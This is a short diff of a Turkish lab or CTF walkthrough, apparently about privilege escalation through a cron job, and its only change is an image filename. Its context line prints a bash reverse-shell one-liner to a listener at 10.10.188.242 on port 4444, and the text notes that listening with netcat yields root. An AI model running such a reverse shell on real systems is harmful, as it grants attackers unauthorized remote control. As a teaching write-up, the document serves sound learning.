@@ -365,7 +365,7 @@ bash -i >& /dev/tcp/10.10.188.242/4444 0>&1
 
 Bu komutu yazıp kaydettikten sonra kendi sistemimizde netcat ile dinleme yapmamız gerekiyor ve 1 dakika bekledikten sonra root yetkisine sahip oluyoruz.&#x20;
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
 ### Cron2
 
